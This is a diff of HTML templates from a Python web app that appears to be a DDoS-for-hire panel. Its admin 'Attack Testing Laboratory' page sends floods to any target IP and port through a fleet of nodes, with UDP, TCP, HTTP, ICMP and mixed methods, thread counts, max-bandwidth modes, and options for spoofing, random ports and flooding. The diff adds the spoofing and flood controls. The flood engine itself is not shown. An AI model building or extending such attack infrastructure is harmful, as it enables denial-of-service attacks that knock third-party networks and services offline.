-    <form method="POST" action="/admin/settings/update"><input type="hidden" name="action" value="change_password">
-      <div class="mb-3"><input type="password" name="new_password" class="form-control bg-dark text-white" placeholder="New password" required></div>
-      <div class="mb-3"><input type="password" name="confirm_password" class="form-control bg-dark text-white" placeholder="Confirm password" required></div>
-      <button type="submit" class="btn btn-primary">Update Password</button>
-    </form>
-  </div>
-  <div class="tab-pane fade" id="broadcast">
-    <h5>Send Message to All Users</h5>
-    <form method="POST" action="/admin/settings/update"><input type="hidden" name="action" value="broadcast">
-      <textarea name="message" class="form-control bg-dark text-white mb-3" rows="4" placeholder="Your message..." required></textarea>
-      <button type="submit" class="btn btn-info">Send Broadcast</button>
-    </form>
-  </div>
-</div>
-</div></div>
-<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
-</body></html>
-'''
-
 ADMIN_TEST_ATTACK_HTML = '''
 <!DOCTYPE html>
 <html><head><title>Test Attack • Admin</title><meta name="viewport" content="width=device-width, initial-scale=1">
@@ -2084,15 +2135,11 @@ body{background:radial-gradient(circle at 10% 20%, #0a0a1a, #000);font-family:'I
 .glass-card:hover{transform:translateY(-3px);border-color:rgba(0,255,200,0.4);box-shadow:0 10px 30px rgba(0,0,0,0.3);}
 .btn-neon{background:linear-gradient(90deg,#00b377,#00cc88);border:none;border-radius:60px;padding:12px 24px;font-weight:bold;color:#000;}
 .btn-neon:hover{transform:scale(1.02);box-shadow:0 0 15px #00ff88;}
-.btn-danger{background:linear-gradient(90deg,#ff3366,#ff6680);border:none;border-radius:60px;padding:12px 24px;font-weight:bold;color:#fff;}
-.btn-warning{background:linear-gradient(90deg,#ffaa00,#ffcc33);border:none;border-radius:60px;padding:12px 24px;font-weight:bold;color:#000;}
 input,select{background:rgba(0,0,0,0.5);border:1px solid #2a3a5a;border-radius:40px;padding:12px 20px;color:white;width:100%;}
 .status-badge{padding:4px 10px;border-radius:40px;font-size:12px;font-weight:600;}
 .status-success{background:rgba(0,204,136,0.2);color:#00cc88;border:1px solid #00cc88;}
 .status-failed{background:rgba(255,51,102,0.2);color:#ff3366;border:1px solid #ff3366;}
-.status-running{background:rgba(255,170,0,0.2);color:#ffaa00;border:1px solid #ffaa00;}
 @keyframes fadeIn{from{opacity:0;transform:translateY(10px);}to{opacity:1;transform:translateY(0);}}
-.fade-in{animation:fadeIn 0.5s;}
 </style></head>
 <body><div class="container">
 <div class="d-flex justify-content-between align-items-center mb-4"><h2><i class="fas fa-flask me-2" style="color:var(--neon);"></i>Attack Testing Laboratory</h2><a href="/admin/dashboard" class="btn btn-outline-light"><i class="fas fa-arrow-left"></i> Back</a></div>
@@ -2100,17 +2147,31 @@ input,select{background:rgba(0,0,0,0.5);border:1px solid #2a3a5a;border-radius:4
 <!-- Quick Test Panel -->
 <div class="glass-card"><h4><i class="fas fa-bolt me-2"></i>Quick Test Configuration</h4>
 <p class="text-warning"><i class="fas fa-exclamation-triangle me-1"></i> Use a safe target (e.g., 127.0.0.1 or a test server).</p>
-<form method="POST" id="testForm">
+<form method="POST">
     <div class="row g-3">
-        <div class="col-md-3"><label class="form-label">Target IP</label><input type="text" name="target" class="form-control bg-dark text-white" placeholder="192.168.1.1" required></div>
-        <div class="col-md-2"><label class="form-label">Port</label><input type="number" name="port" class="form-control bg-dark text-white" placeholder="443" required></div>
-        <div class="col-md-2"><label class="form-label">Duration (max 30s)</label><input type="number" name="duration" class="form-control bg-dark text-white" value="10" min="1" max="30"></div>
-        <div class="col-md-2"><label class="form-label">Method</label>
+        <div class="col-md-3"><label>Target IP</label><input type="text" name="target" class="form-control bg-dark text-white" placeholder="192.168.1.1" required></div>
+        <div class="col-md-2"><label>Port</label><input type="number" name="port" class="form-control bg-dark text-white" placeholder="443" required></div>
+        <div class="col-md-2"><label>Duration (max 30s)</label><input type="number" name="duration" class="form-control bg-dark text-white" value="10" min="1" max="30"></div>
+        <div class="col-md-3">
+            <label>Method</label>
             <select name="method" class="form-select bg-dark text-white">
-                <option value="udp">🔥 UDP</option><option value="tcp">🌐 TCP</option><option value="http">💻 HTTP</option><option value="icmp">📡 ICMP</option><option value="mixed">⚡ MIXED</option>
+                {% for val, label in methods %}
+                <option value="{{ val }}">{{ label }}</option>
+                {% endfor %}
             </select>
         </div>
-        <div class="col-md-2"><label class="form-label">Threads</label><input type="number" name="threads" class="form-control bg-dark text-white" value="500"></div>
+        <div class="col-md-2"><label>Mode</label>
+            <select name="mode" class="form-select bg-dark text-white">
+                <option value="default">Default</option><option value="max-pps">Max PPS</option><option value="max-bandwidth">Max BW</option><option value="both">Both</option>
+            </select>
+        </div>
+        <div class="col-md-2"><label>Threads</label><input type="number" name="threads" class="form-control bg-dark text-white" value="500"></div>
+        <div class="col-md-2 d-flex align-items-end">
+            <div><label class="form-check-label me-2"><input type="checkbox" name="random_ports" value="1"> RandPorts</label></div>
+            <div><label class="form-check-label me-2"><input type="checkbox" name="spoof" value="1"> Spoof</label></div>
+            <div><label class="form-check-label"><input type="checkbox" name="flood" value="1"> Flood</label></div>
+        </div>
+        <div class="col-md-2"><label>PPS Limit</label><input type="number" name="pps_limit" class="form-control bg-dark text-white" value="0"></div>
         <div class="col-md-1 d-flex align-items-end"><button type="submit" class="btn-neon w-100"><i class="fas fa-play"></i> Test All</button></div>
     </div>
 </form>
@@ -2121,10 +2182,10 @@ input,select{background:rgba(0,0,0,0.5);border:1px solid #2a3a5a;border-radius:4
 <div id="nodeListContainer"><div class="text-center text-muted">Loading nodes...</div></div>
 </div>
 
-<!-- Results Panel (appears after test) -->
+<!-- Results Panel -->
 {% if results %}
 <div class="glass-card fade-in"><h4><i class="fas fa-clipboard-list me-2"></i>Test Results</h4>
-<p><strong>Target:</strong> {{ target }}:{{ port }} | <strong>Duration:</strong> {{ duration }}s | <strong>Method:</strong> {{ method }} | <strong>Threads:</strong> {{ threads }}</p>
+<p><strong>Target:</strong> {{ target }}:{{ port }} | <strong>Duration:</strong> {{ duration }}s | <strong>Method:</strong> {{ method }} | <strong>Mode:</strong> {{ mode }} | <strong>Threads:</strong> {{ threads }}</p>
 <div class="table-responsive"><table class="table table-dark table-hover">
     <thead><tr><th>Node</th><th>Type</th><th>Status</th><th>Details</th></tr></thead>
     <tbody>{% for r in results %}<tr><td>{{ r.name }}</td><td>{{ r.type }}</td><td><span class="status-badge {% if 'Success' in r.status %}status-success{% else %}status-failed{% endif %}">{{ r.status }}</span></td><td><small>{{ r.details or '' }}</small></td></tr>{% endfor %}</tbody>
@@ -2135,7 +2196,6 @@ input,select{background:rgba(0,0,0,0.5);border:1px solid #2a3a5a;border-radius:4
 </div>
 
 <script>
-// Load nodes for individual testing
 async function loadNodes() {
     try {
         const res = await fetch('/admin/nodes/status/all');
@@ -2158,31 +2218,24 @@ async function loadNodes() {
         });
         html += '</div>';
         container.innerHTML = html;
-    } catch(e) {
-        console.error(e);
-    }
+    } catch(e) { console.error(e); }
 }
 
-// Test a single node
 async function testSingleNode(nodeId, nodeName) {
-    if (!confirm(`Test attack on ${nodeName}? Use default test target (127.0.0.1:443, 10s, UDP, 500 threads).`)) return;
-    
-    // Show loading
+    if (!confirm(`Test attack on ${nodeName}? Use default test target (127.0.0.1:443, 5s, UDP).`)) return;
     const btn = event.target;
     const originalText = btn.innerHTML;
     btn.innerHTML = '<span class="spinner-border spinner-border-sm"></span> Testing...';
     btn.disabled = true;
-    
     try {
-        // Quick test with predefined safe parameters
         const formData = new FormData();
         formData.append('target', '127.0.0.1');
         formData.append('port', '443');
         formData.append('duration', '5');
         formData.append('method', 'udp');
+        formData.append('mode', 'default');
         formData.append('threads', '500');
         formData.append('single_node', nodeId);
-        
         const res = await fetch('/admin/test-attack/single', { method: 'POST', body: formData });
         const data = await res.json();
         alert(`Test on ${nodeName}: ${data.status} - ${data.message}`);
@@ -2194,7 +2247,6 @@ async function testSingleNode(nodeId, nodeName) {
     }
 }
 
-// Load nodes on page load
 document.addEventListener('DOMContentLoaded', loadNodes);
 </script>
 </body></html>
@@ -2381,6 +2433,8 @@ function copyKey(key) { navigator.clipboard.writeText(key); alert('Key copied!')
 <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
 </body></html>
 '''
+
+
 
 # ==================== RUN ====================
 if __name__ == '__main__':
